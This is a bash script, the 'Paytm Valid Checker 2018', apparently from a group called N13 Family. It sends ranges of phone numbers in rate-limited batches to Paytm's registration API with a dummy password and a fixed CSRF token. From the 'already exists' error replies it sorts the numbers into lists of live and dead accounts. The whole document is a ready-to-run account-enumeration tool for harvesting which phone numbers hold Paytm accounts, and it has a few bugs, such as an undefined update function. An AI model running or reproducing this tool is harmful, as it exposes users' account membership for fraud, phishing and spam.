#!/bin/bash
# Paytm Valid Checker 2018
# 06 March 2018
# By Cli Malhadi V1 And Recoded By N13

RED='\e[1;91m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
ORANGE='\033[0;33m' 
PUR='\033[0;35m'
GRN="\e[1;92m"
WHI="\e[1;37m"
NC='\e[1;37m'
MAGENTA='\e[1;35m'
echo ""
printf "$NC\n"
cat <<EOF
             - https://noname13.com-
          [+] albamzz0@gmail.com [+]
        
---------------------------------------------------
   N13 Family - Paytm Phone Number Validator 2018
---------------------------------------------------

EOF

usage() { 
  echo "Usage: ./myscript.sh COMMANDS: [-i <list.txt>] [-r <folder/>] [-l {1-1000}] [-t {1-10}] OPTIONS: [-d] [-c]

Command:
-i (20k-US.txt)     File input that contain phone number to check
-r (result/)        Folder to store the result live.txt and die.txt
-l (60|90|110)      How many list you want to send per delayTime
-t (3|5|8)          Sleep for -t when check is reach -l fold

Options:
-d                  Delete the list from input file per check
                    move result folder to haschecked/
-h                  Show this manual to screen
-u                  Check integrity file then update

Report any bugs to: <Bambang Priyanto> albamzz0@gmail.com
"
  exit 1 
}

# Assign the arguments for each
# parameter to global variable
while getopts ":i:r:l:t:dchu" o; do
    case "${o}" in
        i)
            inputFile=${OPTARG}
            ;;
        r)
            targetFolder=${OPTARG}
            ;;
        l)
            sendList=${OPTARG}
            ;;
        t)
            perSec=${OPTARG}
            ;;
        d)
            isDel='y'
            ;;
        h)
            usage
            ;;
        u)
            updater "manual"
            ;;
    esac
done

# Do automatic update
# before passing arguments
echo "[+] Recoded By ❤ - Time: `date`"

if [[ $inputFile == '' || $targetFolder == '' || $sendList == '' || $perSec == '' ]]; then
  cli_mode="interactive"
else
  cli_mode="interpreter"
fi

# Assign false value boolean
# to both options when its null
if [ -z "${isDel}" ]; then
  isDel='n'
fi

SECONDS=0

# Asking user whenever the
# parameter is blank or null

if [[ $inputStart == '' ]]; then
  # Print available file on
  # current folder
  # clear
  read -p "Enter Start number: " inputStart
fi

if [[ $inputEnd == '' ]]; then
  # Print available file on
  # current folder
  # clear
  read -p "Enter End number: " inputEnd
fi

if [[ $targetFolder == '' ]]; then
  read -p "Enter target folder: " targetFolder
  # Check if result folder exists
  # then create if it didn't
  if [[ ! -d "$targetFolder" ]]; then
    echo "[+] Creating $targetFolder/ folder"
    mkdir $targetFolder
  else
    read -p "$targetFolder/ folder are exists, append to them ? [y/n]: " isAppend
    if [[ $isAppend == 'n' ]]; then
      exit
    fi
  fi
else
  if [[ ! -d "$targetFolder" ]]; then
    echo "[+] Creating $targetFolder/ folder"
    mkdir $targetFolder
  fi
fi

if [[ $sendList == '' ]]; then
  read -p "How many list send: " sendList
fi

if [[ $perSec == '' ]]; then
  read -p "Delay time: " perSec
fi

n13_paytm() {
  SECONDS=0

  check=`curl 'https://accounts.paytm.com/v3/api/register' -H 'origin: https://accounts.paytm.com' -H 'accept-encoding: gzip, deflate, br' -H 'accept-language: en-US,en;q=0.9,id;q=0.8' -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36' -H 'content-type: application/json' -H 'accept: application/json, text/plain, */*' -H 'referer: https://accounts.paytm.com/oauth2/authorize?theme=mp-web&redirect_uri=https%3A%2F%2Fpaytm.com%2Fv1%2Fapi%2Fauthresponse&is_verification_excluded=false&client_id=paytm-web-secure&type=web_server&scope=paytm&response_type=code' -H 'authority: accounts.paytm.com' --data-binary '{"email":"","mobile":"'$1'","loginPassword":"123aa","csrfToken":"e44e559d604e515dba067418d3f7a3ca","redirectUri":"https://paytm.com/v1/api/authresponse","clientId":"paytm-web-secure","scope":"paytm","state":"","responseType":"code","theme":"mp-web","dob_agreement":true}' --compressed -D - -s`
  duration=$SECONDS
  val="$(echo "$check" | grep -c 'The mobile number you entered already exists with another account')"
  inv="$(echo "$check" | grep -c 'CSRF Token validation error')"
  bad="$(echo "$check" | grep -c 'Email must be valid.')"
  icl="$(echo "$check" | grep -c 'This mobile number already exists with another account.')"
  basd="$(echo "$check" | grep -c 'Bad Request')"

  if [[ $val > 0 || $icl > 0 ]]; then
    printf "${GRN}[LIVE] => $1 [ $3 ] ${NC}\n"
    echo "LIVE => $1" >> $2/live.txt
  else
    if [[ $inv > 0 || $bad > 0 || basd > 0 ]]; then
      printf "${RED}[DIE] => $1 [ $3 ] ${NC}\n"
      echo "DIE => $1" >> $2/die.txt
    else
      printf "${CYAN}[UNKNOWN] => $1 [ $3 ] ${NC}\n"
      echo "$1 => $check" >> reason.txt
    fi
  fi

  printf "\r"
}


# Preparing file list 
# by using phone number pattern 
# every line in $inputFile

# Fi
echo "########################################"

con=1

echo "[+] Sending $sendList phone number per $perSec seconds"

for (( i = $inputStart; i < $inputEnd; i++ )); do
  nomorsatu="$i"
  indexer=$((con++))
  tot=$((inputEnd--))
  fold=`expr $i % $sendList`
  if [[ $fold == 0 && $i > 0 ]]; then
    header="`date +%H:%M:%S`"
    duration=$SECONDS
    echo "Waiting $perSec second. $(($duration / 3600)) hours $(($duration / 60 % 60)) minutes and $(($duration % 60)) seconds elapsed, With $sendList req / $perSec seconds."
    sleep $perSec
  fi
  vander=`expr $i % 8`

  
  n13_paytm "$nomorsatu" "$targetFolder" "$tot" &

done 

# waiting the background process to be done
# then checking list from garbage collector
# located on $targetFolder/unknown.txt
echo "[+] Waiting background process to be done"
wait
wc -l $targetFolder/*

#rm $inputFile
duration=$SECONDS
echo "$(($duration / 3600)) hours $(($duration / 60)) minutes and $(($duration % 60)) seconds elapsed."
echo "+==========+ N13 Family - paytmid 2018 - Bambang Priyanto +==========+"